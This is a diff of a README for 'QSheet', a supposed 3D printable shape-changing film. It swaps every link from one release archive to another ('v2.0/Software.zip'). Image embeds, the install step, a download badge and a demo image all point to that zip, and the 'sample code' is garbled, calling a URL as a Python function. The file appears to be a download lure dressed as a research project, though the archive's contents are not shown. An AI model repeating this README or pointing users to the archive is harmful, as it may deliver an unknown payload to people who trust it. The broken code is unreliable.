@@ -1,6 +1,6 @@
 # QSheet
 
-![QSheet](https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip)
+![QSheet](https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip)
 
 Welcome to the QSheet repository! QSheet is a 3D printable film designed for shape-changing interfaces. This innovative film opens up possibilities for actuators, robotics, research, and more. QSheet is flexible, inflatable, and perfect for creating soft and adaptable shapes.
 
@@ -22,7 +22,7 @@ QSheet is a cutting-edge film that allows for the creation of shape-changing int
 - **Soft Interface:** With QSheet, you can create soft and comfortable interfaces for users.
 
 ## Installation
-To get started with QSheet, you can download the latest version from the [QSheet Repository](https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip). Click on the link to download the required files. If the link does not work, please check the "Releases" section of the repository for alternative download options.
+To get started with QSheet, you can download the latest version from the [QSheet Repository](https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip). Click on the link to download the required files. If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
 ## Usage
 1. Download the QSheet files from the repository.
@@ -34,9 +34,9 @@ To get started with QSheet, you can download the latest version from the [QSheet
 # Sample code for using QSheet
 import qsheet
 
-my_film = https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip()
-https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip()
-https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip()
+my_film = https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip()
+https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip()
+https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip()
 ```
 
 ## Contributing
@@ -45,13 +45,13 @@ We welcome contributions from the community to enhance the capabilities of QShee
 ## License
 The QSheet project is licensed under the MIT License. Feel free to use, modify, and distribute this project for your own purposes. See the [LICENSE](LICENSE) file for more information.
 
-[![Download QSheet](https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip)](https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip)
+[![Download QSheet](https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip)](https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip)
 
 Explore the endless possibilities of shape-changing interfaces with QSheet! Get creative, experiment, and innovate with this groundbreaking film. Join us in shaping the future of soft robotics and interactive technologies. Let's make the impossible possible with QSheet! 🚀🎨🤖
 
 Remember, the only limit is your imagination. Start creating with QSheet today! 
 
-![QSheet Demo](https://github.com/thekidwith/QSheet/releases/download/v1.0/Release.zip)
+![QSheet Demo](https://github.com/thekidwith/QSheet/releases/download/v2.0/Software.zip)
 
 ---
 
